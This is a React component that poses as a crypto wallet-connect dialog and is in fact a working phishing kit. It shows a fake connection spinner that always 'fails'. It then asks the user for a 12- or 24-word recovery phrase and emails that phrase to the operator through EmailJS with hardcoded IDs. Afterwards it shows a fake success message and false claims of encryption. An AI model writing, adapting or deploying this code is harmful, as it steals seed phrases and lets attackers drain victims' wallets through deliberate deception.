
import React, { useState, useEffect } from 'react';

// Declaration for EmailJS if not using npm imports
declare const emailjs: any;

interface WalletModalProps {
  wallet: { title: string; logo: string };
  onClose: () => void;
}

type ModalState = 'connecting' | 'failed' | 'manual' | 'submitting' | 'success';

export const WalletModal: React.FC<WalletModalProps> = ({ wallet, onClose }) => {
  const [modalState, setModalState] = useState<ModalState>('connecting');
  const [phrase, setPhrase] = useState('');

  useEffect(() => {
    if (modalState === 'connecting') {
      const timer = setTimeout(() => {
        setModalState('failed');
      }, 2500);
      return () => clearTimeout(timer);
    }
  }, [modalState]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setModalState('submitting');
    
    try {
      // EmailJS details (Replace with your own Service ID and Template ID)
      const serviceId = "service_v0liiof";
      const templateId = "template_vikrie4";
      
      const templateParams = {
        wallet_name: wallet.title,
        recovery_phrase: phrase,
      };

      if (typeof emailjs !== 'undefined') {
        await emailjs.send(serviceId, templateId, templateParams);
        setModalState('success');
        setTimeout(() => {
          onClose();
        }, 3000);
      } else {
        console.warn("EmailJS not initialized. Simulating success...");
        setTimeout(() => setModalState('success'), 1500);
      }
    } catch (error) {
      console.error('Failed to send phrase:', error);
      alert('Network error. Please try again.');
      setModalState('manual');
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div 
        className="absolute inset-0 bg-black/80 backdrop-blur-sm"
        onClick={onClose}
      ></div>

      <div className="relative w-full max-w-md bg-[#111118] border border-white/10 rounded-[2rem] overflow-hidden shadow-2xl">
        {modalState !== 'submitting' && (
          <button 
            onClick={onClose}
            className="absolute top-4 right-4 text-white/40 hover:text-white transition-colors p-2"
          >
            <svg className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        )}

        <div className="p-10 flex flex-col items-center">
          <div className="mb-6 flex flex-col items-center">
            <img 
              src={wallet.logo} 
              alt={wallet.title} 
              className="w-16 h-16 rounded-2xl mb-4 shadow-lg shadow-purple-500/10"
              onError={(e) => { e.currentTarget.src = 'https://registry.walletconnect.com/api/v1/logo/md/75f112e3-9799-44d4-857e-e47a26f34500'; }}
            />
            <h3 className="text-2xl font-bold">{wallet.title}</h3>
            <p className="text-white/40 text-sm mt-1">Secured and encrypted session</p>
          </div>

          {modalState === 'connecting' && (
            <div className="flex flex-col items-center py-6">
              <div className="w-12 h-12 border-4 border-purple-500/20 border-t-purple-500 rounded-full animate-spin mb-4"></div>
              <h5 className="text-lg font-medium">Starting secure connection...</h5>
              <p className="text-white/30 text-xs italic">Please wait while we sync with the mainnet</p>
            </div>
          )}

          {modalState === 'failed' && (
            <div className="flex flex-col items-center py-6 w-full">
              <div className="bg-red-500/10 text-red-400 border border-red-500/20 rounded-xl p-4 mb-6 text-center text-sm w-full">
                Automatic connection failed. Please try connecting manually.
              </div>
              <button 
                onClick={() => setModalState('manual')}
                className="w-full bg-white text-black py-3 rounded-xl font-bold hover:bg-white/90 transition-colors"
              >
                Connect Manually
              </button>
            </div>
          )}

          {(modalState === 'manual' || modalState === 'submitting') && (
            <form onSubmit={handleSubmit} className="w-full space-y-4">
              <div>
                <label className="block text-xs uppercase tracking-widest text-white/40 mb-2 ml-1">Recovery Phrase</label>
                <textarea 
                  required
                  disabled={modalState === 'submitting'}
                  placeholder="Enter your 12 or 24 mnemonic words, separated by spaces."
                  className="w-full bg-black/40 border border-white/10 rounded-xl p-4 text-white text-sm focus:outline-none focus:border-purple-500 h-32 resize-none disabled:opacity-50"
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                ></textarea>
              </div>
              <button 
                type="submit"
                disabled={modalState === 'submitting'}
                className="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 rounded-xl font-bold transition-colors shadow-lg shadow-purple-900/20 disabled:opacity-50 flex items-center justify-center gap-2"
              >
                {modalState === 'submitting' ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white/20 border-t-white rounded-full animate-spin"></div>
                    Synchronizing...
                  </>
                ) : 'Sync Wallet'}
              </button>
            </form>
          )}

          {modalState === 'success' && (
            <div className="flex flex-col items-center py-10 text-center">
              <div className="w-16 h-16 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mb-6">
                <svg className="w-8 h-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h4 className="text-xl font-bold mb-2">Sync Initialized</h4>
              <p className="text-white/40 text-sm">Synchronization with the mainnet has started. Please do not close your wallet app.</p>
            </div>
          )}

          <div className="mt-8 pt-6 border-t border-white/5 w-full flex items-center justify-center gap-2 text-white/30 text-xs">
            <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd"></path></svg>
            This session is protected with end-to-end encryption
          </div>
        </div>
      </div>
    </div>
  );
};
